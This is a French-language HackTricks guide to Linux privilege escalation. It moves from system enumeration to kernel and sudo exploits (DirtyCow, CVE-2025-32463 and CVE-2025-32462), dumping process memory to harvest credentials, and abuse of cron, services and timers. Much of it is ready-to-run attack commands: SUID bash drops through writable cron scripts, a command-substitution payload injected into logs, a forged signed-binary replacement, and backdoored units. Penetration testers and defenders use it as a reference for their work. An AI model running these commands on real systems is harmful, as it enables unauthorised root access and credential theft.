# Élévation de privilèges Linux

{{#include ../../../banners/hacktricks-training.md}}

Pour un contexte plus large et les workflows historiques d’énumération, consultez les ressources g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation et linux-private-i listées dans les références.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Informations système

### Informations sur l’OS

Commençons par recueillir quelques informations sur l’OS en cours d’exécution
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Si vous **disposez d’autorisations d’écriture sur un dossier quelconque présent dans la variable `PATH`**, vous pourriez être en mesure de détourner certaines bibliothèques ou certains binaires :
```bash
echo $PATH
```
### Infos sur l'environnement

Des informations intéressantes, des mots de passe ou des clés d'API dans les variables d'environnement ?
```bash
(env || set) 2>/dev/null
```
### Exploits du kernel

Vérifiez la version du kernel et s’il existe un exploit pouvant être utilisé pour escalader les privilèges.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Vous pouvez trouver une bonne liste de kernels vulnérables ainsi que des **exploits compilés** ici : [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) et [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Autres sites où vous pouvez trouver des **exploits compilés** : [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Pour extraire toutes les versions de kernel vulnérables depuis ce site, vous pouvez exécuter :
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Les outils qui peuvent aider à rechercher des kernel exploits sont :

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (à exécuter sur la victime, vérifie uniquement les exploits pour le kernel 2.x)

Recherchez toujours **la version du kernel sur Google** ; il est possible que votre version du kernel soit mentionnée dans un kernel exploit, vous serez alors certain que cet exploit est valide.

Techniques supplémentaires d’exploitation du kernel :

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Élévation de privilèges Linux - Kernel Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Version de Sudo

D’après les versions vulnérables de sudo qui apparaissent dans :
```bash
searchsploit sudo
```
Vous pouvez vérifier si la version de sudo est vulnérable avec ce grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Les versions de Sudo antérieures à 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permettent aux utilisateurs locaux non privilégiés d'élever leurs privilèges à root via l'option `--chroot` de sudo lorsque le fichier `/etc/nsswitch.conf` est utilisé depuis un répertoire contrôlé par l'utilisateur.<sup>[[28]](#references)[[29]](#references)</sup>

Voici un [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) pour exploiter cette [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Avant d'exécuter l'exploit, assurez-vous que votre version de `sudo` est vulnérable et qu'elle prend en charge la fonctionnalité `chroot`.

Pour plus d'informations, consultez l'[advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) originale concernant cette [vulnerability].<sup>[[28]](#references)</sup>

### Contournement des règles Sudo basées sur l'hôte (CVE-2025-32462)

Sudo antérieur à 1.9.17p1 (plage affectée signalée : **1.8.8–1.9.17**) peut évaluer les règles sudoers basées sur l'hôte en utilisant le **hostname fourni par l'utilisateur** avec `sudo -h <host>` au lieu du **hostname réel**. Si sudoers accorde des privilèges plus étendus sur un autre hôte, vous pouvez **spoof** cet hôte localement.<sup>[[29]](#references)</sup>

Conditions requises :
- Version vulnérable de sudo
- Règles sudoers spécifiques à l'hôte (l'hôte n'est ni le hostname actuel ni `ALL`)

Exemple de modèle sudoers :
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploiter en usurpant l’hôte autorisé :
```bash
sudo -h devbox id
sudo -h devbox -i
```
Si la résolution du nom usurpé est bloquée, ajoutez-le à `/etc/hosts` ou utilisez un hostname qui apparaît déjà dans les logs/configurations afin d’éviter les recherches DNS.

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Échec de la vérification de signature de Dmesg

Consultez la **box smasher2 de HTB** pour un **exemple** de la manière dont cette vulnérabilité pourrait être exploitée
```bash
dmesg 2>/dev/null | grep "signature"
```
### Plus d’énumération du système
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Énumérer les défenses possibles

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Si vous êtes à l'intérieur d'un conteneur, commencez par la section suivante sur la container-security, puis passez aux pages d'abus spécifiques au runtime :


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Disques

Vérifiez **ce qui est monté et démonté**, où et pourquoi. Si un élément est démonté, vous pouvez essayer de le monter et de vérifier s'il contient des informations privées
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Logiciels utiles

Énumérer les binaires utiles
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Vérifiez également si **un compilateur est installé**. Cela peut être utile si vous devez utiliser un kernel exploit, car il est recommandé de le compiler sur la machine où vous allez l'utiliser (ou sur une machine similaire).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Logiciels vulnérables installés

Vérifiez la **version des paquets et services installés**. Il existe peut-être une ancienne version de Nagios, par exemple, qui pourrait être exploitée pour élever les privilèges…\
Il est recommandé de vérifier manuellement la version des logiciels installés les plus suspects.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Si vous avez un accès SSH à la machine, vous pouvez également utiliser **openVAS** pour vérifier la présence de logiciels obsolètes et vulnérables installés sur la machine.

> [!NOTE] > _Notez que ces commandes afficheront beaucoup d'informations qui seront pour la plupart inutiles. Il est donc recommandé d'utiliser des applications comme OpenVAS ou similaires, qui vérifieront si la version d'un logiciel installé est vulnérable à des exploits connus._

## Processus

Examinez **quels processus** sont en cours d'exécution et vérifiez si un processus dispose de **plus de privilèges qu'il ne devrait** (par exemple, un tomcat exécuté par root ?).
```bash
ps aux
ps -ef
top -n 1
```
Vérifiez toujours la présence éventuelle de [**electron/cef/chromium debuggers** en cours d'exécution, vous pourriez les exploiter pour élever vos privilèges](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** les détecte en recherchant le paramètre `--inspect` dans la ligne de commande du processus.\
Vérifiez également **vos privilèges sur les binaires des processus**, vous pouvez peut-être remplacer celui de quelqu'un d'autre.

### Chaînes parent-enfant entre utilisateurs

Un processus enfant s'exécutant sous un **utilisateur différent** de son parent n'est pas automatiquement malveillant, mais constitue un **signal de triage** utile. Certaines transitions sont attendues (`root` lançant un utilisateur de service, les gestionnaires de connexion créant des processus de session), mais des chaînes inhabituelles peuvent révéler des wrappers, des helpers de debug, de la persistence ou des frontières de confiance runtime faibles.

Vérification rapide :
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Si vous trouvez une chaîne surprenante, examinez la ligne de commande du parent ainsi que tous les fichiers qui influencent son comportement (`config`, `EnvironmentFile`, scripts auxiliaires, répertoire de travail, arguments inscriptibles). Dans plusieurs chemins réels de privesc, l’enfant lui-même n’était pas inscriptible, mais la **config contrôlée par le parent** ou la chaîne d’assistance l’était.

### Fichiers exécutables supprimés et fichiers supprimés ouverts

Les artefacts d’exécution restent souvent accessibles **après leur suppression**. Cela est utile à la fois pour l’escalade de privilèges et pour récupérer des preuves depuis un processus qui a déjà des fichiers sensibles ouverts.

Vérifiez les fichiers exécutables supprimés :
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Si `/proc/<PID>/exe` pointe vers `(deleted)`, le processus exécute toujours l’ancienne image binaire depuis la mémoire. C’est un signal important à examiner, car :

- l’exécutable supprimé peut contenir des chaînes ou des identifiants intéressants
- le processus en cours d’exécution peut toujours exposer des descripteurs de fichiers utiles
- un binaire privilégié supprimé peut indiquer une altération récente ou une tentative de nettoyage

Collectez globalement les fichiers ouverts supprimés :
```bash
lsof +L1
```
Si vous trouvez un descripteur intéressant, récupérez-le directement :
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Cela est particulièrement utile lorsqu’un processus a toujours ouvert un secret, un script, un export de base de données ou un fichier de flag supprimé.

### Surveillance des processus

Vous pouvez utiliser des outils comme [**pspy**](https://github.com/DominicBreuker/pspy) pour surveiller les processus. Cela peut être très utile pour identifier les processus vulnérables exécutés fréquemment ou lorsque certaines conditions sont réunies.

### Mémoire des processus

Certains services d’un serveur enregistrent des **identifiants en texte clair dans la mémoire**.\
Normalement, vous aurez besoin de **privilèges root** pour lire la mémoire des processus appartenant à d’autres utilisateurs. Cela est donc généralement plus utile lorsque vous êtes déjà root et souhaitez découvrir d’autres identifiants.\
Cependant, rappelez-vous qu’**en tant qu’utilisateur standard, vous pouvez lire la mémoire des processus qui vous appartiennent**.

> [!WARNING]
> Notez qu’aujourd’hui, la plupart des machines **n’autorisent pas ptrace par défaut**, ce qui signifie que vous ne pouvez pas dumper les autres processus appartenant à votre utilisateur non privilégié.
>
> Le fichier _**/proc/sys/kernel/yama/ptrace_scope**_ contrôle l’accessibilité de ptrace :
>
> - **kernel.yama.ptrace_scope = 0** : tous les processus peuvent être débogués, à condition qu’ils aient le même uid. Il s’agit du fonctionnement classique de ptrace.
> - **kernel.yama.ptrace_scope = 1** : seul un processus parent peut être débogué.
> - **kernel.yama.ptrace_scope = 2** : seul l’administrateur peut utiliser ptrace, car cela nécessite la capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3** : aucun processus ne peut être tracé avec ptrace. Une fois cette valeur définie, un redémarrage est nécessaire pour réactiver ptrace.

#### GDB

Si vous avez accès à la mémoire d’un service FTP, par exemple, vous pouvez récupérer le Heap et y rechercher ses identifiants.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script GDB
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Pour un identifiant de processus donné, **maps indique comment la mémoire est mappée dans l'espace d'adressage virtuel de ce processus** ; il indique également les **permissions de chaque région mappée**. Le pseudo-fichier **mem expose directement la mémoire du processus**. À partir du fichier **maps**, nous savons quelles **régions mémoire sont lisibles** ainsi que leurs offsets. Nous utilisons ces informations pour **nous positionner dans le fichier mem et extraire toutes les régions lisibles** dans un fichier.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` permet d'accéder à la mémoire **physique** du système, et non à la mémoire virtuelle. L'espace d'adressage virtuel du kernel est accessible via /dev/kmem.\
Généralement, `/dev/mem` est uniquement lisible par **root** et le groupe **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump pour Linux

ProcDump est une réinterprétation Linux de l’outil classique ProcDump de la suite d’outils Sysinternals pour Windows. Téléchargez-le sur [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Pour extraire la mémoire d’un processus, vous pouvez utiliser :

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Vous pouvez supprimer manuellement les exigences root et extraire la mémoire du processus qui vous appartient
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root requis)

### Credentials depuis la mémoire d’un processus

#### Exemple manuel

Si vous constatez que le processus d’authentification est en cours d’exécution :
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Vous pouvez dumper le processus (voir les sections précédentes pour trouver différentes façons de dumper la mémoire d’un processus) et rechercher des identifiants dans la mémoire :
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

L’outil [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) va **voler des identifiants en clair depuis la mémoire** et certains **fichiers connus**. Il nécessite les privilèges root pour fonctionner correctement.

| Fonctionnalité                                    | Nom du processus      |
| ------------------------------------------------- | ---------------------- |
| Mot de passe GDM (Kali Desktop, Debian Desktop)   | gdm-password           |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (connexions FTP actives)                   | vsftpd               |
| Apache2 (sessions HTTP Basic Auth actives)        | apache2              |
| OpenSSH (sessions SSH actives - utilisation de Sudo) | sshd:                |

#### Regex de recherche/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Tâches planifiées/Cron

### Crontab UI (alseambusher) exécuté en tant que root – privesc via un scheduler web

Si un panneau web « Crontab UI » (alseambusher/crontab-ui) s’exécute en tant que root et est uniquement lié à l’interface loopback, vous pouvez tout de même y accéder via une redirection de port local SSH et créer une tâche privilégiée pour effectuer une escalation de privilèges.<sup>[[1]](#references)[[4]](#references)</sup>

Chaîne typique
- Découvrir le port accessible uniquement via loopback (p. ex. 127.0.0.1:8000) et le realm Basic-Auth via `ss -ntlp` / `curl -v localhost:8000`
- Trouver les identifiants dans les artefacts opérationnels :
- Backups/scripts avec `zip -P <password>`
- Unité systemd exposant `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Établir le tunnel et se connecter :
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Créer un job high-priv et l’exécuter immédiatement (dépose un shell SUID) :
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Utilisez-le :
```bash
/tmp/rootshell -p   # root shell
```
Durcissement
- N’exécutez pas Crontab UI en tant que root ; limitez-le avec un utilisateur dédié et des permissions minimales
- Effectuez une liaison à localhost et restreignez en outre l’accès via un pare-feu/VPN ; ne réutilisez pas les mots de passe
- Évitez d’intégrer des secrets dans les fichiers unit ; utilisez des secret stores ou un EnvironmentFile accessible uniquement à root
- Activez l’audit/la journalisation pour les exécutions de jobs à la demande

Vérifiez si un job planifié est vulnérable. Vous pouvez peut-être tirer parti de l’exécution d’un script par root (wildcard vuln ? pouvez-vous modifier des fichiers utilisés par root ? utiliser des symlinks ? créer des fichiers spécifiques dans le répertoire utilisé par root ?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Si `run-parts` est utilisé, vérifiez quels noms seront réellement exécutés :
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Cela évite les faux positifs. Un répertoire périodique accessible en écriture n'est utile que si le nom de fichier de votre payload correspond aux règles locales de `run-parts`.

### Chemin Cron

Par exemple, dans _/etc/crontab_, vous pouvez trouver le PATH : _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Notez que l'utilisateur « user » dispose de privilèges d'écriture sur /home/user_)

Si, dans ce crontab, l'utilisateur root tente d'exécuter une commande ou un script sans définir le path. Par exemple : _\* \* \* \* root overwrite.sh_\
Alors, vous pouvez obtenir un shell root en utilisant :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron utilisant un script avec un wildcard (Wildcard Injection)

Si un script est exécuté par root et contient un « **\*** » dans une commande, vous pouvez l’exploiter pour provoquer des comportements inattendus (comme une privesc). Exemple :
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Si le wildcard est précédé d'un chemin comme** _**/some/path/\***_ **, il n'est pas vulnérable (même** _**./\***_ **ne l'est pas).**

Consultez la page suivante pour découvrir d'autres techniques d'exploitation des wildcards :


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Injection d'expansion arithmétique Bash dans les parseurs de logs cron

Bash effectue l'expansion des paramètres et la substitution de commandes avant l'évaluation arithmétique dans ((...)), $((...)) et let. Si un cron/parser exécuté en tant que root lit des champs de logs non fiables et les transmet dans un contexte arithmétique, un attaquant peut injecter une substitution de commande $(...) qui s'exécute en tant que root lors de l'exécution du cron.<sup>[[22]](#references)</sup>

- Pourquoi cela fonctionne : dans Bash, les expansions se produisent dans cet ordre : expansion des paramètres/variables, substitution de commandes, expansion arithmétique, puis découpage des mots et expansion des chemins. Ainsi, une valeur comme `$(/bin/bash -c 'id > /tmp/pwn')0` est d'abord substituée (ce qui exécute la commande), puis le `0` numérique restant est utilisé pour le calcul arithmétique afin que le script continue sans erreur.

- Schéma vulnérable typique :
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation : faites écrire du texte contrôlé par l'attaquant dans le log analysé, de sorte que le champ ressemblant à une valeur numérique contienne une substitution de commande et se termine par un chiffre. Assurez-vous que votre commande n'affiche rien sur stdout (ou redirigez sa sortie) afin que l'expression arithmétique reste valide.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Écrasement de script cron et symlink

Si vous **pouvez modifier un script cron** exécuté par root, vous pouvez obtenir un shell très facilement :
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Si le script exécuté par root utilise un **répertoire auquel vous avez un accès complet**, il pourrait être utile de supprimer ce dossier et de **créer un dossier lien symbolique vers un autre dossier** contenant un script que vous contrôlez.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validation des liens symboliques et gestion plus sûre des fichiers

Lors de l’examen de scripts/binaires privilégiés qui lisent ou écrivent des fichiers par chemin, vérifiez la manière dont les liens sont gérés :

- `stat()` suit un lien symbolique et renvoie les métadonnées de la cible.
- `lstat()` renvoie les métadonnées du lien lui-même.
- `readlink -f` et `namei -l` aident à résoudre la cible finale et à afficher les permissions de chaque composant du chemin.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Pour les defenders/developers, les méthodes plus sûres contre les techniques exploitant les symlinks incluent :

- `O_EXCL` avec `O_CREAT` : échoue si le chemin existe déjà (bloque les links/files précréés par l’attaquant).
- `openat()` : opère relativement à un file descriptor de répertoire de confiance.
- `mkstemp()` : crée des fichiers temporaires de manière atomique avec des permissions sécurisées.

### Binaries cron signés sur mesure avec des payloads inscriptibles

Les Blue teams « signent » parfois les binaries déclenchés par cron en extrayant une section ELF personnalisée et en recherchant une chaîne du vendor avant de les exécuter en tant que root. Si ce binary est inscriptible par le groupe (par exemple, `/opt/AV/periodic-checks/monitor` appartenant à `root:devs 770`) et que vous pouvez leak le matériel de signature, vous pouvez forger la section et hijack la tâche cron :<sup>[[2]](#references)</sup>

1. Utilisez `pspy` pour capturer le flux de vérification. Dans Era, root exécutait `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, suivi de `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, puis exécutait le fichier.
2. Recréez le certificat attendu à l’aide de la clé/config leakées (depuis `signing.zip`) :
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Construisez un remplacement malveillant (par exemple, déposer un bash SUID ou ajouter votre clé SSH) et intégrez le certificat dans `.text_sig` afin que le grep réussisse :
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Écrasez le binary planifié tout en conservant les bits d’exécution :
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Attendez la prochaine exécution de cron ; une fois la vérification de signature naïve réussie, votre payload s’exécute en tant que root.

### Tâches cron fréquentes

Vous pouvez monitorer les process afin de rechercher ceux qui sont exécutés toutes les 1, 2 ou 5 minutes. Vous pourrez peut-être en tirer parti pour effectuer une privilege escalation.

Par exemple, pour **monitorer toutes les 0,1 s pendant 1 minute**, **trier par commandes les moins exécutées** et supprimer les commandes qui ont été exécutées le plus souvent, vous pouvez exécuter :
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Vous pouvez également utiliser** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (cela surveillera et listera chaque processus qui démarre).

### Backups root qui préservent les bits de mode définis par l’attaquant (pg_basebackup)

Si un cron appartenant à root exécute `pg_basebackup` (ou toute copie récursive) sur un répertoire de base de données dans lequel vous pouvez écrire, vous pouvez déposer un **binaire SUID/SGID** qui sera recopié en tant que **root:root**, avec les mêmes bits de mode, dans la sortie du backup.<sup>[[26]](#references)</sup>

Flux de découverte typique (en tant qu’utilisateur DB disposant de faibles privilèges) :
- Utilisez `pspy` pour repérer un cron root appelant quelque chose comme `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` chaque minute.
- Confirmez que le cluster source (par exemple, `/var/lib/postgresql/14/main`) est accessible en écriture pour vous et que la destination (`/opt/backups/current`) devient détenue par root après l’exécution de la tâche.

Exploitation :
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Cela fonctionne parce que `pg_basebackup` préserve les bits de mode des fichiers lors de la copie du cluster ; lorsqu’il est exécuté par root, les fichiers de destination héritent de la **propriété de root + des bits SUID/SGID choisis par l’attaquant**. Toute routine de backup/copie privilégiée similaire qui conserve les permissions et écrit dans un emplacement exécutable est vulnérable.

### Tâches cron invisibles

Il est possible de créer une tâche cron **en plaçant un retour chariot après un commentaire** (sans caractère de nouvelle ligne), et la tâche cron fonctionnera. Exemple (notez le caractère de retour chariot) :
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Pour détecter ce type de point d’entrée furtif, examinez les fichiers cron avec des outils qui affichent les caractères de contrôle :
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Services

### Fichiers _.service_ modifiables

Vérifiez si vous pouvez écrire dans un fichier `.service` quelconque ; si c'est le cas, vous **pourriez le modifier** afin qu'il **exécute** votre **backdoor lorsque** le service est **démarré**, **redémarré** ou **arrêté** (vous devrez peut-être attendre le redémarrage de la machine).\
Par exemple, créez votre backdoor dans le fichier .service avec **`ExecStart=/tmp/script.sh`**

### Binaires de services modifiables

Gardez à l'esprit que si vous disposez des **permissions d'écriture sur les binaires exécutés par les services**, vous pouvez les modifier pour y placer des backdoors ; ainsi, lorsque les services seront réexécutés, les backdoors seront exécutées.

### systemd PATH - Chemins relatifs

Vous pouvez voir le PATH utilisé par **systemd** avec :
```bash
systemctl show-environment
```
Si vous constatez que vous pouvez **écrire** dans l’un des dossiers du chemin, vous pourrez peut-être **escalader vos privilèges**. Vous devez rechercher les **chemins relatifs utilisés dans les fichiers de configuration des services**, comme :
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Ensuite, créez un **exécutable** portant le **même nom que le binaire du chemin relatif** dans le dossier PATH de systemd où vous pouvez écrire. Lorsque le service doit exécuter l’action vulnérable (**Start**, **Stop**, **Reload**), votre **backdoor sera exécutée** (les utilisateurs non privilégiés ne peuvent généralement pas démarrer ou arrêter des services, mais vérifiez si vous pouvez utiliser `sudo -l`).

**Pour en savoir plus sur les services, consultez `man systemd.service`.**

## **Timers**

Les **Timers** sont des fichiers d’unités systemd dont le nom se termine par `**.timer**` et qui contrôlent les fichiers `**.service**` ou des événements. Les **Timers** peuvent être utilisés comme alternative à cron, car ils prennent en charge nativement les événements horaires calendaires et les événements temporels monotones, et peuvent être exécutés de manière asynchrone.

Vous pouvez lister tous les timers avec :
```bash
systemctl list-timers --all
```
### Timers modifiables

Si vous pouvez modifier un timer, vous pouvez lui faire exécuter certaines unités de systemd.unit (comme un `.service` ou une `.target`)
```bash
Unit=backdoor.service
```
